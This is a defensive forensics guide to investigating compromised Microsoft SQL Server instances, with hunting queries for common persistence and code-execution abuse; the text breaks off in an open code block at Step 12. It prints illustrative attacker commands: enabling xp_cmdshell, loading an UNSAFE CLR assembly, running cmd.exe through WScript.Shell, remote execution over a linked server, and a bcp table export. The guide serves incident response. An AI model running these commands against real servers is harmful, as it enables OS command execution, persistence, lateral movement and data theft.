# SQL Server Forensics

Microsoft SQL Server is one of the most consistently valuable footholds an attacker can land on inside an enterprise network. It is reachable two ways that matter to an investigation: **directly**, when an instance is exposed with weak or default credentials (the `sa` account and mixed-mode authentication are the classic path), and **indirectly**, when a vulnerable front-end web application talks to a SQL Server backend and a SQL-injection flaw gives an attacker a query interface into the database engine without ever touching the database's own login prompt. Either path lands the attacker inside an engine that runs as a powerful service account (frequently `LocalSystem` or a highly privileged domain service account) and ships a deep set of built-in stored procedures that were explicitly designed to reach *outside* the database — into the filesystem, the registry, the OS command shell, and other SQL instances. A compromised SQL Server is very rarely the end of an investigation; it is a pivot point, and the built-in features that make it a good database server are the same features that make it a good backdoor.

This note is written for the moment an analyst is handed a SQL Server box mid-incident — what to check first, where the evidence actually lives, and which native SQL Server capabilities get weaponized as persistence and code-execution primitives. SQL Server Agent Jobs are this platform's version of a Scheduled Task — general scheduled-task theory (XML structure, `TaskCache`, event-log mechanics) is owned by [`10/Scheduled Tasks.md`](<../10 - Persistence Mechanisms/Scheduled Tasks.md>) and is not re-derived here. Linked servers are this platform's version of lateral movement between trusted systems — full source/destination lateral-movement depth is owned by [`12 - Lateral Movement`](<../12 - Lateral Movement.md>).

> 🔴 **`sysadmin` membership and `xp_cmdshell` are this note's two load-bearing checks.** Everything else covered below — CLR assemblies, OLE Automation procedures, linked servers, Agent Jobs, startup stored procedures — is a variation on the same underlying fact: once an attacker has (or a legitimate account already has) the `sysadmin` fixed server role, SQL Server's own feature set hands them a code-execution pivot onto the underlying operating system. A finding is never "`xp_cmdshell` exists" — it ships disabled-by-default but present on every instance — it's "`xp_cmdshell` is currently enabled, was recently enabled, or was called by an account that had no business calling it."

## Contents

- [🎯 Hunt Evil](#-hunt-evil)
- [SQL Server Fundamentals](#sql-server-fundamentals)
- [Step 1 — Identify the Instance(s), Version, and Edition](#step-1--identify-the-instances-version-and-edition)
- [Step 2 — Locate the Logs](#step-2--locate-the-logs)
- [Step 3 — Read the Logs: Error Log Format and the Default Trace](#step-3--read-the-logs-error-log-format-and-the-default-trace)
- [Step 4 — Enumerate Logins, Roles, and sysadmin Membership](#step-4--enumerate-logins-roles-and-sysadmin-membership)
- [Step 5 — Hunt xp_cmdshell Abuse](#step-5--hunt-xp_cmdshell-abuse)
- [Step 6 — Hunt CLR Assembly Abuse](#step-6--hunt-clr-assembly-abuse)
- [Step 7 — Hunt OLE Automation Procedure Abuse](#step-7--hunt-ole-automation-procedure-abuse)
- [Step 8 — Hunt Linked Server Abuse (Lateral Movement)](#step-8--hunt-linked-server-abuse-lateral-movement)
- [Step 9 — Hunt SQL Server Agent Job Persistence](#step-9--hunt-sql-server-agent-job-persistence)
- [Step 10 — Hunt Startup Stored Procedures](#step-10--hunt-startup-stored-procedures)
- [Step 11 — Failed/Successful Login Sweep](#step-11--failedsuccessful-login-sweep)
- [Step 12 — Data-Theft and Filesystem Recon](#step-12--data-theft-and-filesystem-recon)
- [The sqlservr.exe → cmd.exe Red Flag](#the-sqlservrexe--cmdexe-red-flag)
- [Investigative Sequence Summary](#investigative-sequence-summary)
- [Pitfalls](#pitfalls)
- [Red Flags](#red-flags)
- [MITRE ATT&CK Techniques Covered](#mitre-attck-techniques-covered)
- [Tooling](#tooling)
- [Correlate With](#correlate-with)
- [Resources](#resources)

## 🎯 Hunt Evil

Immediate-triage T-SQL and PowerShell, runnable in the first few minutes on a box handed over mid-incident. Every query here assumes an authenticated connection with at least `sysadmin`-adjacent read access (`VIEW SERVER STATE` at minimum) — if the analyst's own account can't run these, that's itself a scoping problem to resolve first.

```sql
-- Instance identity - what am I actually looking at (Step 1)
SELECT @@VERSION AS Version, SERVERPROPERTY('ProductVersion') AS ProductVersion,
       SERVERPROPERTY('Edition') AS Edition, SERVERPROPERTY('InstanceName') AS InstanceName,
       SERVERPROPERTY('MachineName') AS MachineName, SERVERPROPERTY('IsClustered') AS IsClustered;

-- Who holds sysadmin - the single highest-value privilege check on the whole box (Step 4)
SELECT sp.name AS LoginName, sp.type_desc AS LoginType, sp.create_date, sp.modify_date, sp.is_disabled
FROM sys.server_role_members srm
JOIN sys.server_principals sp ON srm.member_principal_id = sp.principal_id
JOIN sys.server_principals r  ON srm.role_principal_id  = r.principal_id
WHERE r.name = 'sysadmin' ORDER BY sp.name;

-- Current xp_cmdshell state - enabled means a code-execution pivot to the OS already exists (Step 5)
SELECT name, value, value_in_use, description FROM sys.configurations WHERE name = 'xp_cmdshell';

-- User-defined CLR assemblies running outside SAFE - the SQLCLR backdoor primitive (Step 6)
SELECT name, permission_set_desc, create_date FROM sys.assemblies WHERE is_user_defined = 1 AND permission_set_desc <> 'SAFE';

-- OLE Automation config state - the older sibling of xp_cmdshell (Step 7)
SELECT name, value_in_use FROM sys.configurations WHERE name = 'Ole Automation Procedures';

-- Linked servers with RPC Out enabled - cross-instance lateral-movement primitive (Step 8)
SELECT name, product, provider, data_source, is_linked, is_rpc_out_enabled FROM sys.servers WHERE server_id <> 0;

-- Agent jobs that shell out to the OS or run PowerShell - the Agent-Job persistence pattern (Step 9)
SELECT j.name AS JobName, s.step_name, s.subsystem, s.command, j.enabled
FROM msdb.dbo.sysjobs j JOIN msdb.dbo.sysjobsteps s ON j.job_id = s.job_id
WHERE s.subsystem IN ('CmdExec','PowerShell');

-- Startup stored procedures - fires on every service start, no user session required (Step 10)
SELECT name FROM sys.procedures WHERE OBJECTPROPERTY(object_id, 'ExecIsStartUp') = 1;
```

```powershell
# sqlservr.exe spawning cmd.exe - the single highest-value process-tree red flag in this note (see below)
Get-CimInstance Win32_Process -Filter "Name='cmd.exe'" | ForEach-Object {
    $parent = Get-CimInstance Win32_Process -Filter "ProcessId=$($_.ParentProcessId)"
    if ($parent.Name -eq 'sqlservr.exe') {
        [PSCustomObject]@{ ChildCommandLine = $_.CommandLine; ChildPID = $_.ProcessId; ParentPID = $_.ParentProcessId }
    }
}
```

## SQL Server Fundamentals

**Instance model.** A single Windows host can run one **default instance** and any number of **named instances**, side by side, each with its own independent set of services, ports, databases, logs, and configuration. Everything in this note — logs, logins, `xp_cmdshell` state, Agent Jobs — is scoped **per instance**, not per host; a finding on one instance says nothing about a second instance sitting on the same box.

| | Default instance | Named instance |
|---|---|---|
| Connection string | `<host>` or `<host>\MSSQLSERVER` | `<host>\<InstanceName>` |
| Windows service name | `MSSQLSERVER` | `MSSQL$<InstanceName>` |
| Default TCP port | 1433 | Dynamic (negotiated), unless a static port is explicitly configured |
| Discovery | Assumed at 1433 | Resolved via the **SQL Server Browser** service (UDP 1434) — if Browser is stopped/removed, a named instance's port must be discovered another way (registry, netstat, config) |

**Relevant services** (all live under `services.msc` / `Get-Service`, and each is independently start/stop/disable-able):

| Service | Display purpose | Notes for an investigation |
|---|---|---|
| `MSSQLSERVER` / `MSSQL$<Instance>` | The database engine itself (`sqlservr.exe`) | The process this whole note revolves around; check its logon account (`ObjectName` in the service's registry key — see [`04 - Registry Forensics Fundamentals`](<../04 - Registry Forensics Fundamentals.md>)) since that account's OS-level privilege is exactly what `xp_cmdshell`/OLE Automation/CLR abuse inherits |
| `SQLSERVERAGENT` / `SQLAgent$<Instance>` | SQL Server Agent — the job scheduler (see Step 9) | Runs as its own configurable service account, frequently over-privileged relative to what job scheduling actually needs |
| `SQLBrowser` | Named-instance/port resolution (UDP 1434) | Not itself a common attack surface, but its presence/absence changes how you discover a named instance's listening port during scoping |
| `MSSQLFDLauncher` / `MSSQLFDLauncher$<Instance>` | Full-Text Search launcher | Rarely security-relevant, listed here for completeness when enumerating the instance's service footprint |

**Where things live on disk.** The install path encodes the major version and instance name, which is often the fastest way to identify both without ever connecting to the engine:

```
C:\Program Files\Microsoft SQL Server\MSSQL<VersionToken>.<InstanceName>\MSSQL\
```

| Version token | SQL Server release |
|---|---|
| `MSSQL11` | SQL Server 2012 |
| `MSSQL12` | SQL Server 2014 |
| `MSSQL13` | SQL Server 2016 |
| `MSSQL14` | SQL Server 2017 |
| `MSSQL15` | SQL Server 2019 |
| `MSSQL16` | SQL Server 2022 |

Under that root, `Log\` holds the Error Log family (Step 2/3), `DATA\` holds the `.mdf`/`.ldf` database and transaction-log files, and `Binn\` holds `sqlservr.exe` itself.

**Authentication mode.** SQL Server runs in either **Windows Authentication** mode (only domain/local Windows identities can log in) or **Mixed Mode** (Windows identities *and* SQL-native logins, including `sa`, can log in). The configured mode lives in the registry:

```
HKLM\SOFTWARE\Microsoft\Microsoft SQL Server\<InstanceID>\MSSQLServer\LoginMode
```

`LoginMode = 1` is Windows-only; `LoginMode = 2` is Mixed Mode. Mixed Mode is what makes `sa`-password brute-forcing a viable external attack path at all — an instance running Windows-only auth cannot be attacked this way from outside the domain, which is a meaningful scoping fact early in an investigation (see Step 11).

## Step 1 — Identify the Instance(s), Version, and Edition

Before pulling a single log, establish exactly what is running on the box — version, edition, patch level, and every instance present, not just the one you were told about.

```sql
SELECT @@VERSION AS Version,
       SERVERPROPERTY('ProductVersion')  AS ProductVersion,
       SERVERPROPERTY('ProductLevel')    AS ProductLevel,   -- RTM, SPx, CUx
       SERVERPROPERTY('Edition')         AS Edition,        -- Express/Standard/Enterprise/Developer
       SERVERPROPERTY('InstanceName')    AS InstanceName,   -- NULL = default instance
       SERVERPROPERTY('MachineName')     AS MachineName,
       SERVERPROPERTY('IsClustered')     AS IsClustered,
       SERVERPROPERTY('IsHadrEnabled')   AS IsAlwaysOnEnabled;
```

Enumerate every instance on the host, live, rather than trusting whatever ticket/CMDB entry brought you here:

```powershell
# Registry-based enumeration of every SQL Server instance actually installed on this host
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server' -Name InstalledInstances -ErrorAction SilentlyContinue |
    Select-Object -ExpandProperty InstalledInstances

# Every SQL-family service and its current state, across every instance on the host
Get-Service | Where-Object { $_.Name -match '^(MSSQL|SQLAgent|SQLBrowser|MSSQLFDLauncher)' } |
    Select-Object Name, DisplayName, Status, StartType
```

**SQL Server Configuration Manager** (`SQLServerManager<ver>.msc`) is the GUI equivalent — use it when working interactively to confirm protocol configuration (is TCP/IP enabled, static vs. dynamic port) and the service account each instance actually runs as, both of which matter directly to the privilege inherited by `xp_cmdshell`/OLE Automation abuse later in this note.

## Step 2 — Locate the Logs

| Source | Default location | Notes |
|---|---|---|
| **SQL Server Error Log** | `...\MSSQL\Log\ERRORLOG` (current) plus numbered archives `ERRORLOG.1`, `ERRORLOG.2`, … | Rotates on every service restart by default; `sp_cycle_errorlog` forces a manual rotation (which an attacker could abuse to push older evidence into the archive faster than usual, or — rarely — to force rotation right before an action to keep it out of the "current" file an analyst opens first) |
| **Default Trace** | `...\MSSQL\Log\log.trc` (plus rollover files) | On by default historically via the `default trace enabled` server configuration option — **confirm it's actually on**, since it is one of the few security-relevant features an attacker with `sysadmin` can simply switch off |
| **Extended Events `system_health` session** | Always running by default from SQL Server 2008 R2 SP1 onward | Not a security-audit log by design (built for deadlocks, severe errors, waits), but its `error_reported` events (severity ≥ 20) and ring-buffer data are worth a pull when other sources are thin |
| **Transaction log (`.ldf`)** | `...\MSSQL\DATA\<db>_log.ldf` | The only source that can show the actual DML (INSERT/UPDATE/DELETE) an attacker ran against table data — see the caveat on recovery model below |
| **Windows Security log — 4625/4624** | Standard Windows Security log | **Only captures Windows-authenticated logons.** SQL-authenticated logons (including every `sa` attempt) never appear here at all — see Step 11 |

If the default path was changed, don't assume — ask the engine directly:

```sql
SELECT SERVERPROPERTY('ErrorLogFileName') AS CurrentErrorLogPath;
```

or read the startup parameters straight from the registry (the `-e` startup flag controls the error log path):

```powershell
$instanceKey = 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\<InstanceID>\MSSQLServer\Parameters'
Get-ItemProperty $instanceKey | Get-Member -MemberType NoteProperty | Where-Object Name -match '^SqlArg' |
    ForEach-Object { (Get-ItemProperty $instanceKey).($_.Name) }
# SqlArg0 = -d (master data file) · SqlArg1 = -e (error log path) · SqlArg2 = -l (master log file)
```

🔴 **`.ldf` DML recovery is gated by the database's recovery model.** A database in **SIMPLE** recovery truncates its transaction log on every checkpoint — meaningful DML history rarely survives more than a few minutes to hours. A database in **FULL** recovery retains log records until a log backup runs, which makes `.ldf` (and any surviving log backups) a genuinely useful DML-forensics source over a much longer window. Check `SELECT name, recovery_model_desc FROM sys.databases;` before promising a stakeholder that deleted-row recovery from the transaction log is possible.

## Step 3 — Read the Logs: Error Log Format and the Default Trace

**Error Log structure.** Each line is a timestamp, the SPID (session ID) or subsystem tag that generated it, and a free-text message — informational (startup parameters, backup/restore completion, configuration changes) and error/warning messages (failed logins, corruption, out-of-memory conditions) are interleaved in the same file with no separate severity-based log. There is no fixed schema to parse against — this is a plain-text, grep-first artifact. The two message patterns worth searching for immediately:

- Every SQL-authenticated login failure is recorded here, in the general shape `Login failed for user '<name>'. Reason: <reason>. [CLIENT: <ip>]` — this is frequently the **only** place a SQL-auth brute-force attempt's source IP is recorded at all (see Step 11).
- Service startup entries record the startup parameters and any configuration changes applied at boot — useful for confirming when `xp_cmdshell`/CLR/OLE Automation were enabled relative to the service's own uptime.

**The Default Trace.** A lightweight, always-recording SQL Trace (the older tracing mechanism, distinct from Extended Events) that captures a curated set of server- and database-level events without the overhead of a full audit. Query it through `sys.fn_trace_gettable` rather than opening `log.trc` directly:

```sql
DECLARE @path NVARCHAR(260) = (SELECT TOP 1 path FROM sys.traces WHERE is_default = 1);

SELECT te.name AS EventName, t.LoginName, t.HostName, t.ApplicationName,
       t.TextData, t.ObjectName, t.DatabaseName, t.StartTime
FROM sys.fn_trace_gettable(@path, DEFAULT) t
JOIN sys.trace_events te ON t.EventClass = te.trace_event_id
ORDER BY t.StartTime DESC;
```

| Column | Meaning | Forensic relevance |
|---|---|---|
| `EventClass` | Numeric ID of the event type | Join to `sys.trace_events` (as above) rather than memorizing numeric IDs — they are stable within a version but the safest practice is always resolving them dynamically on the box you're actually working |
| `LoginName` | The SQL/Windows login that generated the event | The "who" |
| `HostName` | Client-reported hostname of the connecting session | Client-supplied, not authenticated — treat as a lead, not ground truth |
| `ApplicationName` | Client-reported application name | Same caveat as `HostName`; SSMS, `sqlcmd`, and custom app connections all self-report differently and none of it is verified by the server |
| `TextData` | The command/statement text for many event classes | Where object-creation and object-alteration statements — including `CREATE ASSEMBLY`, new logins, and role-membership changes — actually surface in readable form |
| `ObjectName` | Name of the object the event acted on | Pairs with `TextData` to confirm exactly what was created/altered/dropped |
| `StartTime` | Event timestamp | Bounds the window for correlating against the Error Log and any host-side (Sysmon/EDR) timeline |

🔴 **Rollover is capped.** The default trace rolls over at a fixed file size across a fixed number of files (5 × 20 MB by default) and **overwrites the oldest file once the cap is hit** — on a busy instance this can mean the trace only covers the last few hours. Don't assume `fn_trace_gettable` covers the entire incident window; check the earliest `StartTime` returned before concluding an event never happened.

## Step 4 — Enumerate Logins, Roles, and sysadmin Membership

This is the single highest-value privilege check on the whole engine. `sysadmin` bypasses every other permission check inside SQL Server — a `sysadmin` login can enable `xp_cmdshell`, create a CLR assembly, add a linked server, or create a startup procedure with zero additional privilege needed.

```sql
-- Every login on the instance, oldest first flipped to newest first - recent creation is the persistence tell
SELECT name, type_desc, create_date, modify_date, is_disabled
FROM sys.server_principals
WHERE type IN ('S','U','G')   -- SQL login, Windows user, Windows group
ORDER BY create_date DESC;

-- sysadmin membership - repeated from Hunt Evil, the query to run first on every engagement
SELECT sp.name AS LoginName, sp.type_desc AS LoginType, sp.create_date, sp.is_disabled
FROM sys.server_role_members srm
JOIN sys.server_principals sp ON srm.member_principal_id = sp.principal_id
JOIN sys.server_principals r  ON srm.role_principal_id  = r.principal_id
WHERE r.name = 'sysadmin' ORDER BY sp.name;

-- Recently created database users, across every database - the DB-scoped persistence equivalent
EXEC sp_MSforeachdb 'USE [?]; SELECT ''?'' AS DatabaseName, name, type_desc, create_date, modify_date
FROM sys.database_principals WHERE type IN (''S'',''U'',''G'') AND create_date > DATEADD(day, -30, GETDATE());'
```

🔴 A newly created SQL login added to `sysadmin` within minutes of a suspicious external connection, or an existing low-privilege login suddenly gaining `sysadmin` membership, is one of the cleanest privilege-escalation signals this platform produces — it is a direct role-membership change, not something that requires inference.

## Step 5 — Hunt xp_cmdshell Abuse

`xp_cmdshell` runs an arbitrary command string through the OS shell (`cmd.exe /c`), returning the output as a result set — a direct, one-statement pivot from a SQL query interface to OS command execution, running with the privilege of the SQL Server service account. It ships **disabled by default** on every modern SQL Server install, which makes its enabled state itself a meaningful finding.

**How it's enabled** — requires `sysadmin` (or explicit `ALTER SETTINGS` server permission):

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

**Current state — ground truth, always check this first:**

```sql
SELECT name, value, value_in_use, description FROM sys.configurations WHERE name = 'xp_cmdshell';
```

`value_in_use = 1` means it is live right now. `value = 1` with `value_in_use = 0` means it was enabled but not yet applied (`RECONFIGURE` pending) or was just disabled and the change hasn't been reflected — treat a mismatch between the two columns as worth a closer look at *when* the change happened.

🔴 **This is the note's real evidentiary gap, and it matters.** SQL Server does **not**, out of the box, log the literal OS command string an `xp_cmdshell` call passes to `cmd.exe` anywhere durable by default. The `RECONFIGURE` confirmation for *enabling* the feature is returned to the calling session, not reliably written to the Error Log or Default Trace. Practical consequence for an investigation:

| Evidence angle | What it tells you | Limitation |
|---|---|---|
| `sys.configurations` current state | Whether it's enabled *right now* | Says nothing about history — it could have been enabled, used, and disabled again before you connected |
| Default Trace / plan cache | May show the enabling `sp_configure` call if it fell inside the trace's rollover window, and may show cached query text if the plan hasn't been evicted | Both are volatile and short-lived — plan cache clears on restart, trace rolls over |
| Retroactive SQL Server Audit / Extended Events session filtered to `xp_cmdshell` RPC calls | The most reliable *going-forward* capture of the actual command text, once stood up | Only captures activity **after** it's configured — useless for reconstructing what already happened |
| **Host-side process telemetry (Sysmon Event ID 1 / EDR)** | The actual command line passed to `cmd.exe`, and everything that spawned from it | **The single most reliable source for this specific gap** — see the process-tree section below |

In practice: use SQL Server's own artifacts to establish *that* `xp_cmdshell` was enabled and roughly *when*, and lean on host-level process-creation telemetry to recover *what was actually run*.

To sweep a fleet of SQL hosts for `xp_cmdshell` currently enabled, use PowerShell with `Invoke-Sqlcmd`:

```powershell
$servers = Get-Content C:\hunt\sql_instances.txt
$servers | ForEach-Object {
    Invoke-Sqlcmd -ServerInstance $_ -Query "SELECT @@SERVERNAME AS Instance, value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'"
}
```

Disable `xp_cmdshell`, but only after the enable-timeline evidence above has been captured. Follow an evidence-first approach, the same principle as every other note in this module:

```sql
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
```

## Step 6 — Hunt CLR Assembly Abuse

SQL Server CLR integration (SQLCLR) lets a `sysadmin` load a compiled .NET assembly directly into the engine and expose its methods as T-SQL stored procedures or functions — legitimate for performance-sensitive custom logic, and a durable code-execution backdoor when abused, since an `UNSAFE` assembly can call arbitrary .NET APIs, including OS process creation, with none of `xp_cmdshell`'s single-statement obviousness.

```sql
-- Requires sysadmin: enable CLR, then load an assembly with full trust
EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
CREATE ASSEMBLY EvilAssembly FROM 0x4D5A9000...  -- raw bytes, or FROM 'C:\path\to\file.dll'
WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE dbo.EvilProc AS EXTERNAL NAME EvilAssembly.[ClassName].[MethodName];
```

Modern SQL Server (2017+) tightened this path with `clr strict security` (on by default, forces even `SAFE`/`EXTERNAL_ACCESS` assemblies through the same signed/trusted validation as `UNSAFE`) and `sys.trusted_assemblies` (a catalog of assembly hashes explicitly trusted at the instance level, independent of the database's `TRUSTWORTHY` setting). None of this prevents abuse by a `sysadmin` — it changes the exact steps, not whether it's possible — but it does mean the presence of an entry in `sys.trusted_assemblies` is itself worth reviewing.

```sql
-- User-defined assemblies outside SAFE, the primary hunt query (also in Hunt Evil)
SELECT name, permission_set_desc, create_date FROM sys.assemblies WHERE is_user_defined = 1 AND permission_set_desc <> 'SAFE';

-- Every stored procedure/function actually backed by a CLR assembly, with its source assembly
SELECT o.name AS ObjectName, o.type_desc, a.name AS AssemblyName, a.permission_set_desc
FROM sys.assembly_modules m
JOIN sys.objects o ON m.object_id = o.object_id
JOIN sys.assemblies a ON m.assembly_id = a.assembly_id;

-- Instance-level trusted-assembly catalog (SQL 2017+) - review every entry, this bypasses per-database TRUSTWORTHY entirely
SELECT * FROM sys.trusted_assemblies;

-- Pull the raw assembly bytes back out for offline hashing/comparison against known-bad
SELECT af.name, af.content FROM sys.assembly_files af
JOIN sys.assemblies a ON af.assembly_id = a.assembly_id WHERE a.name = '<AssemblyName>';
```

🔴 A CLR assembly is a **standing, restart-surviving** backdoor — once created, it re-registers itself on every engine restart with no further action needed, functionally equivalent to a startup stored procedure (Step 10) but harder to spot because it doesn't read as "just a stored proc" at a glance.

## Step 7 — Hunt OLE Automation Procedure Abuse

The `sp_OA*` family (`sp_OACreate`, `sp_OAMethod`, `sp_OAGetProperty`, `sp_OASetProperty`, `sp_OADestroy`) instantiates and drives COM objects from inside T-SQL — a pre-`xp_cmdshell`-era code-execution primitive that is still fully present in modern SQL Server and frequently overlooked precisely because attention defaults to `xp_cmdshell`. The canonical abuse pattern instantiates `WScript.Shell` and calls its `.Run()` method, achieving the same OS command execution as `xp_cmdshell` through an entirely different code path — a real reason an attacker (or a pentester emulating one) reaches for it specifically when `xp_cmdshell` is disabled or monitored:

```sql
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c whoami > C:\temp\out.txt';
```

**Current state:**

```sql
SELECT name, value_in_use FROM sys.configurations WHERE name = 'Ole Automation Procedures';
```

Like `xp_cmdshell`, ships disabled by default, requires `sysadmin` to enable, and carries the **same logging gap** — SQL Server does not durably log the arguments passed to `sp_OAMethod` by default. Watch the Default Trace's `ObjectName`/`TextData` fields for `WScript.Shell`, `Scripting.FileSystemObject`, or other COM ProgIDs appearing in statement text, and treat host-level process telemetry (Step below) as the reliable source for what actually ran, exactly as with `xp_cmdshell`.

🔴 **Don't stop a sweep at `xp_cmdshell` alone.** An engine with `xp_cmdshell` disabled and `Ole Automation Procedures` enabled is just as compromised — this is a genuinely common gap when remediation focuses on the more famous of the two options and misses its older sibling.

## Step 8 — Hunt Linked Server Abuse (Lateral Movement)

A linked server is a persistent, named connection from one SQL Server instance to another (or to any OLE DB-reachable data source), letting a query on Instance A read from or execute against Instance B via `openquery()`/four-part naming/`EXECUTE AT` without a fresh authentication prompt each time. When the stored login mapping for a linked server carries `sysadmin`-equivalent rights on the destination instance, an attacker with any access to Instance A inherits that privilege on Instance B for free — a database-layer trust relationship exploited exactly like a domain trust or a shared local admin password, just one level down the stack.

```sql
-- Every linked server, and whether RPC Out (remote procedure execution) is permitted
SELECT name, product, provider, data_source, is_linked, is_rpc_out_enabled, is_data_access_enabled
FROM sys.servers WHERE server_id <> 0;

-- Login mappings configured for each linked server - does the mapped login carry more privilege than the calling account?
EXEC sp_helplinkedsrvlogin;

-- Executing a query on the remote instance through the linked-server trust
SELECT * FROM OPENQUERY([LinkedServerName], 'SELECT @@VERSION');

-- Remote code execution via a linked server with RPC Out enabled - the lateral-movement primitive itself
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LinkedServerName];
```

🔴 `is_rpc_out_enabled = 1` on a linked server is the finding that turns a passive data-access trust into an active remote-execution primitive — it means `EXECUTE AT` against that linked server can run arbitrary remote procedures, including `xp_cmdshell` on the far end if it's enabled there. Full source/destination pairing, session semantics, and how this compares to the OS-level lateral-movement techniques (`sc create`, WMI, PowerShell Remoting) belongs to [`12 - Lateral Movement`](<../12 - Lateral Movement.md>) — this section covers only the SQL-native mechanics of the trust relationship itself.

## Step 9 — Hunt SQL Server Agent Job Persistence

SQL Server Agent Jobs are this platform's direct analog of a Windows Scheduled Task — a named unit of work with one or more steps and a schedule/trigger, running under the Agent service's own credentials (frequently more privileged than the calling login needs). General scheduled-task forensics — trigger theory, evidence-chain shape, why a boot/startup trigger is the highest-value subset to check first — is fully covered in [`10/Scheduled Tasks.md`](<../10 - Persistence Mechanisms/Scheduled Tasks.md>) and is not re-derived here; this section covers only what's different about the SQL-native version of the same idea.

```sql
-- Every job, every step, and what subsystem each step actually runs - CmdExec/PowerShell steps are the ones that reach the OS
SELECT j.name AS JobName, j.enabled, j.date_created, j.date_modified,
       s.step_id, s.step_name, s.subsystem, s.command,
       sv.name AS ScheduleName, sv.enabled AS ScheduleEnabled
FROM msdb.dbo.sysjobs j
JOIN msdb.dbo.sysjobsteps s ON j.job_id = s.job_id
LEFT JOIN msdb.dbo.sysjobschedules js ON j.job_id = js.job_id
LEFT JOIN msdb.dbo.sysschedules sv ON js.schedule_id = sv.schedule_id
ORDER BY j.date_created DESC;

-- Jobs configured to run when SQL Server Agent starts - the Agent-Job equivalent of a BootTrigger scheduled task
SELECT j.name, s.step_name, s.command
FROM msdb.dbo.sysjobs j
JOIN msdb.dbo.sysjobsteps s ON j.job_id = s.job_id
JOIN msdb.dbo.sysjobschedules js ON j.job_id = js.job_id
JOIN msdb.dbo.sysschedules sv ON js.schedule_id = sv.schedule_id
WHERE sv.freq_type = 64;  -- 64 = "Start automatically when SQL Server Agent starts"

-- Actual run history and the output/result of every execution, not just the job's current definition
SELECT j.name, h.run_date, h.run_time, h.run_status, h.message
FROM msdb.dbo.sysjobhistory h JOIN msdb.dbo.sysjobs j ON h.job_id = j.job_id
ORDER BY h.run_date DESC, h.run_time DESC;
```

🔴 A `CmdExec` or `PowerShell` subsystem step is the exact SQL-layer equivalent of a scheduled task whose `<Actions><Exec>` launches `cmd.exe`/`powershell.exe` — apply the same command-line obfuscation red flags (base64-encoded PowerShell, `-WindowStyle Hidden`, `-NoProfile`) used for Run keys and scheduled tasks elsewhere in this module. A job named to blend with routine maintenance ("IndexMaintenance", "DBBackupCleanup") but carrying a `CmdExec` step is a favorite disguise.

## Step 10 — Hunt Startup Stored Procedures

A stored procedure marked as a **startup procedure** auto-executes every single time the SQL Server *service* starts — before any login, before any application connects, entirely independent of user sessions. This is SQL Server's direct analog of an Autostart Run key: unconditional execution at process start, running with the engine's own service-account privilege.

```sql
-- Mark a procedure (must live in master) as startup - requires sysadmin
EXEC sp_procoption '<ProcName>', 'startup', 'on';
```

Two things must both be true for a startup procedure to actually fire — check both, since either alone is an incomplete picture:

```sql
-- 1. Is the "scan for startup procs" server option even on? Disabled = zero startup procs will ever run, regardless of flags
SELECT name, value_in_use FROM sys.configurations WHERE name = 'scan for startup procs';

-- 2. Which specific procedures are flagged to run at startup
SELECT name, create_date, modify_date FROM sys.procedures WHERE OBJECTPROPERTY(object_id, 'ExecIsStartUp') = 1;
```

🔴 A startup procedure combined with an enabled `xp_cmdshell` is a particularly durable pairing: the procedure fires on every service restart, no interactive login required, and can immediately call `xp_cmdshell` to re-establish C2, re-create a dropped user, or re-enable any configuration option a defender disabled — a self-healing backdoor that survives credential rotation and account lockout alike, since it never depended on an account logging in to begin with.

## Step 11 — Failed/Successful Login Sweep

🔴 **The auth-source split matters more here than almost anywhere else in this module.** Windows-authenticated logons generate the familiar 4624/4625 pair in the Windows Security log. **SQL-authenticated logons do not** — a brute-force attempt against `sa` or any other SQL-native login **never appears in the Windows Security log at all**. The SQL Server Error Log is the only place these are recorded, in the general form `Login failed for user '<name>'. Reason: <reason>. [CLIENT: <ip>]` — and it is frequently the *only* source that captures the attacking client's IP address for this login path.

```sql
-- Recent successful logins from the Default Trace (Audit Login event class)
DECLARE @path NVARCHAR(260) = (SELECT TOP 1 path FROM sys.traces WHERE is_default = 1);
SELECT te.name AS EventName, t.LoginName, t.HostName, t.ApplicationName, t.StartTime
FROM sys.fn_trace_gettable(@path, DEFAULT) t
JOIN sys.trace_events te ON t.EventClass = te.trace_event_id
WHERE te.name IN ('Audit Login','Audit Login Failed')
ORDER BY t.StartTime DESC;
```

```powershell
# Error Log text sweep for failed SQL-auth logins - grep-first, since there's no structured schema for this file
Select-String -Path 'C:\Program Files\Microsoft SQL Server\MSSQL*.*\MSSQL\Log\ERRORLOG*' -Pattern 'Login failed for user' |
    Select-Object LineNumber, Line

# Windows Security log 4625 - only ever covers the Windows-authenticated slice of the same picture
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625; StartTime=(Get-Date).AddHours(-24)} |
    Select-Object TimeCreated, @{N='Account';E={$_.Properties[5].Value}}, @{N='SourceIP';E={$_.Properties[19].Value}}
```

A burst of `sa` login failures in the Error Log, followed by a successful `Audit Login` for `sa` from the same client host/IP, is the SQL-native equivalent of the 4625-burst-then-4624-success pattern covered in depth for RDP in the [RDP Brute-Force and Foothold Playbook](<../Threat Landscape and Playbooks/RDP Brute-Force and Foothold Playbook.md>) — the evidentiary logic transfers directly, just sourced from a different log.

## Step 12 — Data-Theft and Filesystem Recon

Two distinct angles once an attacker has query access, neither of which requires `xp_cmdshell`:

**Mass data movement.** `bcp` (bulk copy program, a command-line utility shipped alongside SQL Server) exports a table or query result straight to a flat file — the most common bulk-exfiltration path once an attacker has read access to sensitive tables:

```
bcp "SELECT * FROM dbo.Customers" queryout C:\temp\customers.csv -c -t, -S <server> -T
```

`BULK INSERT` and `OPENROWSET(BULK...)` are the inbound equivalents (loading a flat file into a table) — less exfil-relevant directly, but worth checking if an attacker used SQL Server itself to stage or move data files around the filesystem as part of a broader operation.

**Filesystem/network reconnaissance from inside SQL.** `xp_dirtree` and `xp_fileexist` are extended stored procedures that let a query enumerate filesystem paths — including UNC paths — without any `xp_cmdshell`-level privilege in many configurations:

```sql
